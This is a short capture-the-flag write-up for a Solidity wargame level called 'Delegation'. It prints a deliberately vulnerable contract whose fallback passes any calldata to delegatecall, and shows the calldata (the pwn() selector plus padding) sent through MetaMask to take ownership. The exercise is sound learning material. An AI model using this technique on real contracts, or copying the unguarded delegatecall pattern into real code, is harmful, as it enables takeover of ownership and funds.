## 6. Delegation

Goal for this exercise is:

- Claim ownership of the instance


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
~~~

Had to read about delecatecall and it took me long time to figure out the right hex data to add with transaction.

Method id can be calculated with `web3.eth.abi.encodeFunctionSignature({name: 'pwn', type: 'function', inputs: []})`.
And hex data still needs empty parameter `0000000000000000000000000000000000000000000000000000000000000000`?

Full hex data to include in metamask transaction was `dd365b8b0000000000000000000000000000000000000000000000000000000000000000`.
